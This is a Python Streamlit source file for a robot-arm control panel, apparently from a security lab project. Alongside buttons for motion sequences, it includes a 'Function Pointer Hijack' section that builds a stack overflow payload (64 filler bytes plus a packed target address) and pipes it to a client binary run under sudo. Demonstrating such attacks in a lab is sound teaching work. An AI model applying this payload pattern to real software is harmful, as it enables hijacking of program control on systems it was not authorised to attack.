import streamlit as st
import subprocess
import os
import time
import threading
from streamlit.runtime.scriptrunner import add_script_run_ctx
import sys
import struct

# --- Configuration ---
CLIENT_EXECUTABLE = "/home/rapid/ssl_project_c/src/client_robot" # Check path
DEFAULT_SERVER_IP = "192.168.1.100" # Adjust if needed

# --- Session State Initialization ---
def initialize_session_state():
    if 'executing' not in st.session_state: st.session_state.executing = False
    if 'status_message' not in st.session_state: st.session_state.status_message = ""
    if 'command_history' not in st.session_state: st.session_state.command_history = []

# --- Client Execution Function (MODIFIED TO USE SUDO) ---
# --- Client Execution Function (MODIFIED TO PASS ENV VAR THROUGH SUDO) ---
def execute_client_command(command_identifier, server_ip, payload_bytes=None):
    """ Executes the client robot command. Reads stdin only for 'attack'. """
    if st.session_state.executing:
        st.warning("Command busy.")
        return

    st.session_state.executing = True
    display_command = f"{command_identifier}{' <payload_via_stdin>' if payload_bytes else ''}"
    st.session_state.status_message = f"Executing: {display_command}"
    st.rerun() # Use rerun to update status immediately

    start_time = time.time()
    combined_output = ""
    exit_code = -1
    status = "Error"

    try:
        # Keep a copy of the base environment for other potential needs
        env = os.environ.copy()
        # We no longer set env["COMMAND"] here, as it's passed via sudo args

        # --- MODIFICATION: Use sudo and pass COMMAND env variable directly ---
        process_args = ['sudo', f'COMMAND={command_identifier}', CLIENT_EXECUTABLE, server_ip]
        # --- END MODIFICATION ---

        stdin_pipe = None
        use_text_mode = True
        input_data = None

        if command_identifier == "attack" and payload_bytes is not None:
            st.write("Debug: Using stdin pipe/binary mode for attack.")
            stdin_pipe = subprocess.PIPE
            use_text_mode = False
            input_data = payload_bytes

        # Execute the command
        process = subprocess.Popen(
            process_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=stdin_pipe,
            text=use_text_mode,
            env=env # Pass the base environment copy
        )

        # Communicate and get output
        stdout_data, stderr_data = process.communicate(input=input_data)
        exit_code = process.returncode

        # Decode if binary mode was used
        stdout = stdout_data
        stderr = stderr_data
        if not use_text_mode:
            stdout = stdout_data.decode(sys.stdout.encoding or 'utf-8', errors='replace') if stdout_data else ""
            stderr = stderr_data.decode(sys.stderr.encoding or 'utf-8', errors='replace') if stderr_data else ""

        combined_output = f"--- STDOUT ---\n{stdout.strip()}\n--- STDERR ---\n{stderr.strip()}"

        # Determine status based on output and exit code
        if exit_code == 0:
            status = "Success"
            st.session_state.status_message = f"Completed: {display_command}"
        elif command_identifier == "attack" and "Control Hijacked!" in stdout + stderr:
            status = "Success (Hijacked!)"
            st.session_state.status_message = f"Attack Succeeded: {display_command}"
        else:
            # Include stderr in the failure message if available
            fail_reason = f" (Exit: {exit_code})"
            if stderr.strip():
                 fail_reason += f" - STDERR: {stderr.strip()}"
            st.session_state.status_message = f"Failed: {display_command}{fail_reason}"
            status = "Failed"


    except FileNotFoundError:
        st.error(f"Error: Client executable not found at '{CLIENT_EXECUTABLE}'. Please check the path.")
        combined_output = f"Error: Client executable not found at '{CLIENT_EXECUTABLE}'."
        status = "Error"
    except Exception as e:
        st.error(f"An unexpected error occurred: {e}")
        combined_output = str(e)
        status = "Error"
        exit_code = -1 # Indicate error explicitly
    finally:
        duration = time.time() - start_time
        st.session_state.command_history.append({
            "command": display_command,
            "status": status,
            "time": time.strftime("%Y-%m-%d %H:%M:%S"), # Added date for clarity
            "output": combined_output,
            "duration": duration,
            "exit_code": exit_code
        })
        st.session_state.executing = False
        st.rerun() # Rerun to update history and status
# --- Thread Starter ---
def start_command_thread(cmd_identifier, ip_addr, payload=None):
     """ Starts the client execution in a separate thread """
     thread = threading.Thread(target=execute_client_command, args=(cmd_identifier, ip_addr, payload))
     add_script_run_ctx(thread) # Add context for Streamlit updates from the thread
     thread.start()

# --- Main UI ---
def main():
    st.set_page_config(page_title="Robot Control", layout="wide")

    # Check if client executable exists
    if not os.path.exists(CLIENT_EXECUTABLE):
        st.error(f"Client executable not found: {CLIENT_EXECUTABLE}. Please ensure it is compiled and the path is correct.")
        st.stop() # Stop execution if client is missing

    initialize_session_state()

    st.title("🔒 Secure Robot Arm Controller (Sequences)")
    st.write("Control interface with sequence execution and final hash verification. Requires `sudo` for GPIO access.")

    server_ip = st.text_input("Server IP Address", DEFAULT_SERVER_IP)

    st.markdown("---")
    st.subheader("Command Sequences")

    # Sequence Buttons
    cols = st.columns(3)
    with cols[0]:
        if st.button("Seq 1: Spin 90° ➡️ Rest", key="seq1", disabled=st.session_state.executing, use_container_width=True):
            start_command_thread("seq1", server_ip)
    with cols[1]:
        if st.button("Seq 2: Spin 90° ➡️ Spin 180°", key="seq2", disabled=st.session_state.executing, use_container_width=True):
             start_command_thread("seq2", server_ip)
    with cols[2]:
        if st.button("Seq 3: Spin 180° ➡️ Rest", key="seq3", disabled=st.session_state.executing, use_container_width=True):
            start_command_thread("seq3", server_ip)

# --- Attack Section (Simplified) ---
    st.markdown("---")
    st.subheader("⚠️ Security Test: Function Pointer Hijack")
    st.markdown("""
    Click the button below to attempt the function pointer hijack attack.
    *(Note: This version sends the 'attack' command. The payload address is hardcoded below.)*
    """)

    # Determine if the attack button should be enabled
    attack_button_enabled = not st.session_state.executing

    if st.button("💥 Launch Function Pointer Hijack Attack", key="attack", disabled=not attack_button_enabled, help="Sends the 'attack' command to the client with a hardcoded payload."):

        # <<<--- START: Hardcoded Address and Payload Generation --->>>
        try:
            # 1. HARDCODE your target address here (replace 0xDEADBEEFCAFE):
            target_addr_hex = "0x4021a4" # Example address

            # 2. Convert hex string to integer:
            target_function_address = int(target_addr_hex, 16)

            # 3. Pack the address as a 64-bit unsigned little-endian integer ('<Q'):
            packed_address = struct.pack('<Q', target_function_address)

            # 4. Construct the payload (adjust buffer size '64' if needed):
            #    Payload = buffer_overflow_data + packed_target_address
            attack_payload_bytes = b'A' * 64 + packed_address

            st.info(f"Using hardcoded address: {target_addr_hex}") # Optional: Show info

            # 5. Start the command thread with the generated payload:
            start_command_thread("attack", server_ip, attack_payload_bytes)

        except ValueError:
            st.error(f"Invalid hardcoded hexadecimal address format: '{target_addr_hex}'. Use '0x...'.")
        except struct.error as e:
            st.error(f"Error packing hardcoded address '{target_addr_hex}': {e}. Is it a valid 64-bit address?")
        except Exception as e:
             st.error(f"An unexpected error occurred preparing the hardcoded payload: {e}")
        # <<<--- END: Hardcoded Address and Payload Generation --->>>

    # --- End Simplified Attack Section ---
    st.markdown("---")

    # Display current status message
    if st.session_state.status_message:
        if "Failed" in st.session_state.status_message:
            st.error(st.session_state.status_message)
        elif "Hijacked!" in st.session_state.status_message:
            st.warning(st.session_state.status_message) # Use warning for successful attack
        elif "Completed" in st.session_state.status_message or "Success" in st.session_state.status_message:
            st.success(st.session_state.status_message)
        else: # Likely "Executing..."
            st.info(st.session_state.status_message)

    if st.session_state.executing:
        st.warning("⏳ Command in progress...")

    st.markdown("---")
    st.header("Command History")

    if st.button("Clear History"):
        st.session_state.command_history = []
        st.session_state.status_message = ""
        st.rerun()

    # Display history items in reverse chronological order
    for item in reversed(st.session_state.command_history):
        status_color = "green" # Default success
        if item['status'] == "Failed": status_color = "red"
        elif item['status'] == "Error": status_color = "orange"
        elif "Hijacked!" in item['status']: status_color = "magenta" # Special color for hijack

        # Use markdown for better formatting inside expander label
        expander_label = f"""
        <span style='font-size: smaller;'>[{item['time']}]</span>
        **{item['command']}** ->
        <span style='color:{status_color}; font-weight:bold;'>{item['status']}</span>
        ({item.get('duration', 0):.2f}s | Exit: {item.get('exit_code', 'N/A')})
        """

        with st.expander(label=expander_label.strip(), expanded=False):
            st.code(item.get('output', 'No output captured'), language='bash') # Use bash for syntax highlight

if __name__ == "__main__":
    main()
